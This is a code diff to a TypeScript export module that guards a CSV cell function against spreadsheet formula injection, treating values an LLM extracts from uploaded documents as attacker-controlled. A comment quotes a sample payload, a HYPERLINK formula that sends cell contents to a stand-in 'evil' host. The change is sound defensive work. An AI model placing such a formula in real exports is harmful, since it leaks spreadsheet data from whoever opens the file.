@@ -101,9 +101,21 @@ export function toXml(rec: DocumentRecord): string {
 
 // ─── CSV ────────────────────────────────────────────────────────────────────
 
-function csvCell(value: string): string {
-  if (/[",\n\r]/.test(value)) return `"${value.replace(/"/g, '""')}"`;
-  return value;
+/**
+ * Cells whose first character is one of these are interpreted as a formula by Excel,
+ * LibreOffice and Google Sheets. Field values come from an LLM reading an uploaded,
+ * attacker-controlled document, so a vendor name of `=HYPERLINK("http://evil/?"&A1)`
+ * would otherwise execute when an operator opens the export.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+/** A value that is just a number is safe even though it may start with `-`. */
+const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;
+
+/** Quote per RFC 4180 and neutralise spreadsheet formula injection. */
+export function csvCell(value: string): string {
+  const safe = FORMULA_LEAD.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value;
+  if (/[",\n\r]/.test(safe)) return `"${safe.replace(/"/g, '""')}"`;
+  return safe;
 }
 
 function flatValue(value: ExtractedField["value"]): string {
